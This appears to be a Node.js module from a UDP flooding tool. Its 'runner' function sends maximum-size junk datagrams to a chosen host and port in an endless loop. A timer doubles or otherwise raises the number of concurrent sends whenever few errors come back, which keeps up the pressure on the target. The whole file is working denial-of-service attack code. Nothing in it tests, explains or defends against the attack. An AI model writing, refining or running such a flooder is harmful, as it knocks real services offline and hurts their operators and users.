const { sleep } = require('./sleep')
const { REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
const dgram = require('dgram')
const client = dgram.createSocket('udp4')

// max size is 9216 otherwise EMSGSIZE error
const messageBuf = Buffer.from('X'.repeat(9216))

const runner = async (host, port, CONCURRENT_REQUESTS, name) => {
  console.log(`Starting process for ${host}:${port} "${name}" with ${CONCURRENT_REQUESTS} max concurrent requests...`)

  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0

  let failureAttempts = 0

  let errRate = 0
  let requests_made = 0

  const interval = setInterval(() => {
    if (failureAttempts === 0) {
      console.log(name, '|', 'Req', requests_made, '|', 'Errors last min,%', errRate, '|', 'R', CONCURRENT_REQUESTS)

      if (errRate > 90) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.5)
      } else if (errRate > 80) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.8)
      } else if (errRate < 1) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 2)
      } else if (errRate < 5) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.5)
      } else if (errRate < 10) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.3)
      } else if (errRate < 20) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.2)
      } else if (errRate < 30) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.05)
      }
      if (CONCURRENT_REQUESTS > MAX_CONCURRENT_REQUESTS) {
        CONCURRENT_REQUESTS = MAX_CONCURRENT_REQUESTS
      } else if (CONCURRENT_REQUESTS < 1) {
        CONCURRENT_REQUESTS = 1
      }

      lastMinuteOk = 0
      lastMinuteErr = 0
    }
  }, INTERVAL)

  while (true) {
    if (pending < CONCURRENT_REQUESTS) {
      pending++
      client.send(messageBuf, 0, messageBuf.length, port, host, (err) => {
        if (err) {
          lastMinuteErr++
          failures++
        } else {
          failures = 0
          failureAttempts = 0
          lastMinuteOk++
        }
        pending--
        requests_made++
        if (lastMinuteErr > 0 || lastMinuteOk > 0) {
          errRate = Math.floor(100 * (lastMinuteErr / (lastMinuteErr + lastMinuteOk)))
        }
      })
    } else {
      await sleep(REQ_DELAY)
    }
  }
}

module.exports = { runner }
